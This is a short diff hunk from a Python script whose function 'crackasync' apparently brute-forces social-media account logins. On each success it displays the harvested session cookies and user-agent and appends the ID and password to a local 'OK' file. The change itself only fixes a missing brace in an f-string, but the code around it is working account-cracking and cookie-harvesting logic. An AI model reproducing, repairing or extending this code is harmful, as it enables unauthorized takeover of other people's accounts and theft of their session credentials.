@@ -919,7 +919,7 @@ def crackasync(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"{color_table}"))
-				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"{color_table}"))
 				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
